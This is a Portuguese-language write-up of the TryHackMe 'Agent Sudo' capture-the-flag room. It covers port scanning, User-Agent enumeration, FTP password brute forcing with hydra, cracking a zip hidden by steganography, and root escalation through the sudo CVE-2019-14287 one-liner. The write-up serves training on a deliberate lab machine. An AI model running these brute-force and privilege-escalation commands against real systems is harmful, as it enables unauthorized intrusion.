> [!WARNING]
> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).

# [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

<a href="https://tryhackme.com/room/agentsudoctf"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/agentsudoctf), feito por [DesKel](https://tryhackme.com/p/DesKel).

Dificuldade: `Fácil`

Resolvido em: `2026/05/28`

# Conteúdos

- [Agent Sudo](#agent-sudo)
- [Conteúdos](#conteúdos)
- [Writeup](#writeup)
   * [Reconhecimento](#reconhecimento)
   * [Exploração](#exploração)
   * [Escalação de Privilégios](#escalação-de-privilégios)

# Writeup

## Reconhecimento

Eu comecei com o básico, adicionando o IP dado ao DNS local `/etc/hosts` como `asc.net` para facilitar o meu trabalho, e verifiquei conexão com ping:

```bash
$ ping -c 3 asc.net
PING asc.net (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from asc.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=144 ms
64 bytes from asc.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=144 ms
64 bytes from asc.net (<MACHINE_IP>): icmp_seq=3 ttl=62 time=144 ms

--- asc.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 143.872/143.907/143.974/0.047 ms
```

E segui para um reconhecimento de portas com `nmap`:[^nmap]

```bash
$ nmap asc.net      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 00:05 UTC
Nmap scan report for asc.net (<MACHINE_IP>)
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
```

Assim já é possível responder uma das perguntas.
- Q: How many open ports? A: 3

Bem, irei começar com o `http` já que é o processo mais simples.

<figure><img src="./assets/asc1.png"></figure>

Okay, então, abri o burpsuit,[^burp] configurei para enviar fazer um mini ataque no user-agent. A ideia seguia que, se o nome do agente principal era "R", então todos devem ter nomes de acordo com a letra do alfabeto. Enviei um request para cada letra e obtive diferentes resultados...

<figure><img src="./assets/asc2.png"></figure>

Notavelmente, apenas os agentes "R" e "C" obtiveram respostas distintas. A resposta do agente "R" era apenas um aviso que "você não deveria impersonar os outros". Ela também continha a dica sobre o alfabeto (26 letras, contando com "R"):

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

O agente "C" realmente tinha uma mensagem:

<figure><img src="./assets/asc3.png"></figure>

- Q: How you redirect yourself to a secret page? A: user-agent
- Q: What is the agent name? A: chris

Aparentemente o agent `chris` tem uma senha fraca. Interessante. Também, aparentemente, existe um agente "J". Segui com a exploração, e infelizmente o `ftp` não tinha conexão anônima. Tentei, usando `hydra`[^hydra] e rockyou,[^rockyou] na força-bruta, descobrir o acesso do Chris:

```bash
$ hydra -l chris -P rockyou.txt ftp://asc.net
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-29 00:55:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://asc.net:21/
[21][ftp] host: asc.net   login: chris   password: <PASS_CH>
```

Okay! Realmente foi fácil descobrir a senha. 

- Q: FTP password A: <PASS_CH>

## Exploração

```bash
$ ftp asc.net
Connected to asc.net.
220 (vsFTPd 3.0.3)
Name (asc.net:kali): chris
331 Please specify the password.
Password: <PASS_CH>
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14643|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Três arquivos: duas fotos e um texto. Para o agente J...

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Bem, então isso é claramente esteganografia.[^steg] Meu binwalk[^binwalk] não estava funcionando corretamente, mas depois de baixar os arquivos diversas vezes finalmente um resultado apareceu:

```bash
$ binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Bem, usando [unroll](https://www.unroll.ing/) eu especifiquei a seção para extrair (do byte `34562` adiante) e adquiri o zip. Mas, como dito na mensagem mais cedo, este estava cifrado. Então usei johntheripper[^john] para retirar o hash:

```bash
$ zip2john hidden.zip > hash.txt
hidden.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:hidden.zip:hidden.zip
```

E eventualmente quebrá-lo:

```bash
$ john --wordlist=/usr/share/john/password.lst hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASS_J0>            (hidden.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2026-05-29 01:51) 33.33g/s 118200p/s 118200c/s 118200C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

A senha é <PASS_J0>!

- Q: Zip file password A: <PASS_J0>

Agora com o arquivo liberado, mais uma mensagem é revelada.

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Direto para [CyberChef](https://gchq.github.io/CyberChef/). Ele até indentificou qual era o ciframento por mim, e assim obtive a próxima senha, <PASS_J1>!

Usando essa senha para decifrar a outra foto (neste caso usei o website [futureboy](https://futureboy.us/stegano/decinput.html)) obtive novamente, uma, uma outra mensagem:

```
Hi <USER_AJ>,

Glad you find this message. Your login password is <PASS_J2>

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Incrível! Agora consigo entrar no `ssh`.

- Q: Who is the other agent (in full name)? A: <USER_AJ>
- Q: SSH password A: <PASS_J2>

## Escalação de Privilégios

```bash
<USER_AJ>@agent-sudo:~$ whoami
<USER_AJ>

<USER_AJ>@agent-sudo:~$ cat user_flag.txt 
<FLAG_USER>
```

Okay, flag de usuário, tudo certo. Vamos tentar seguir explorando...

```bash
<USER_AJ>@agent-sudo:~$ ls
alien_autospy.jpg  h.jpg  user_flag.txt
```

<figure><img src="./assets/alien.jpg"></figure>

Opa, aquele hoax lá. De oitenta mil anos atrás KKKKKKK.
- Q: What is the incident of the photo called? A: Roswell alien autopsy

Enfim:

```bash
<USER_AJ>@agent-sudo:~$ sudo -l
[sudo] password for <USER_AJ>: <PASS_J2> 
Matching Defaults entries for <USER_AJ> on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User <USER_AJ> may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Somente o grupo `root` consegue usar o `/bin/bash` de forma escalada. Usando o `CVE-2019-14287`, fica bem fácil escalar os privilégios devido a um erro de ajuste de números inválidos:

```bash
<USER_AJ>@agent-sudo:~$ sudo -u\#$((0xffffffff)) bash
root@agent-sudo:~# whoami
root
```

- Q: CVE number for the escalation A: CVE-2019-14287

Assim só falta adquirir a flag de root!

```bash
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
<FLAG_ROOT>

By,
<AGENT_R> a.k.a Agent R
```

- Q: (Bonus) Who is Agent R? A: <AGENT_R>


[^nmap]: https://github.com/nmap/nmap
[^burp]: https://portswigger.net/burp
[^john]: https://github.com/openwall/john
[^rockyou]: https://weakpass.com/wordlists/rockyou.txt
[^hydra]: https://github.com/vanhauser-thc/thc-hydra
[^steg]: https://en.wikipedia.org/wiki/Steganography
[^binwalk]: https://github.com/ReFirmLabs/binwalk